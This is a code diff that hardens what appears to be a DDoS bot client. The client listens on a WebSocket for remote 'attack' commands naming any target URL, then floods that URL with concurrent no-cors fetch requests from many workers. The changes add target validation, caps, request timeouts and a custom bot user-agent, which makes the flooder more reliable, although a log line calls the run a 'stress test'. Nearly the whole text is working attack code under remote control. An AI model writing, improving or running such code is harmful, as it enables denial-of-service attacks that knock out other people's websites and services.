@@ -11,9 +11,17 @@ function connect() {
   };
 
   socket.onmessage = (event) => {
-    const data = JSON.parse(event.data);
-    if (data.type === "attack") {
-      startAttack(data.target, data.duration, data.concurrency || 10);
+    try {
+      const data = JSON.parse(event.data);
+      if (data.type === "attack") {
+        if (!data.target || !data.target.startsWith("http")) {
+          console.error("Invalid target:", data.target);
+          return;
+        }
+        startAttack(data.target, data.duration, data.concurrency || 10);
+      }
+    } catch (e) {
+      console.error("Failed to parse message", e);
     }
   };
 
@@ -29,18 +37,28 @@ function connect() {
 
 async function startAttack(target: string, duration: number, concurrency: number) {
   console.log(`Starting stress test on ${target} for ${duration}s with concurrency ${concurrency}`);
-  const endTime = Date.now() + duration * 1000;
+  const endTime = Date.now() + Math.min(duration, 3600) * 1000; // Cap at 1 hour
+  const safeConcurrency = Math.min(concurrency, 500); // Cap workers
   
   const worker = async () => {
     while (Date.now() < endTime) {
       try {
-        await fetch(target, { mode: 'no-cors' }).catch(() => {});
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s timeout
+        
+        await fetch(target, { 
+          mode: 'no-cors',
+          signal: controller.signal,
+          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SYSTUMMM-BOT/1.0' }
+        }).catch(() => {});
+        
+        clearTimeout(timeoutId);
       } catch (e) {}
-      await sleep(5); // Tight loop with minimal delay
+      await sleep(10); // Slight delay to prevent CPU lockup
     }
   };
 
-  const workers = Array.from({ length: concurrency }, () => worker());
+  const workers = Array.from({ length: safeConcurrency }, () => worker());
   await Promise.all(workers);
   
   console.log("Attack finished");
